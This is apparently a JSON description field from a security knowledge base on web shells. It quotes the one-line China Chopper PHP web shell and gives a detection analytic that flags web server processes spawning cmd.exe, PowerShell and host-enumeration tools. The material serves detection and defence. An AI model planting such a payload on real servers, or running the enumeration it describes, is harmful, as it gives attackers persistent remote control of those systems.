  "description": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)\n<code><?php @eval($_POST['password']);></code>\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)\n\nA web shell is a web script placed on an openly accessible web server to allow an adversary to use the server as a gatway in a network. As the shell operates, commands will be issued from within the web application into the broader server operating system. This analytic looks for host enumeration executables initiated by any web service that would not normally be executed within that environment.\n\n<h4>Analytic 1 - Webshell-Indicative Process Tree</h4>\n<code>suspicious_processes = filter processes where (\n  (parent_exe == \"w3wp.exe\" OR\n   parent_exe == \"httpd.exe\" OR\n   parent_exe == \"tomcat*.exe\" OR\n   parent_exe == \"nginx.exe\" ) AND\n  (exe == \"cmd.exe\" OR\n   exe == \"powershell.exe\" OR\n   exe == \"net.exe\" OR\n   exe == \"whoami.exe\" OR\n   exe == \"hostname.exe\" OR\n   exe == \"systeminfo.exe\" OR\n   exe == \"ipconfig.exe) )</code>",
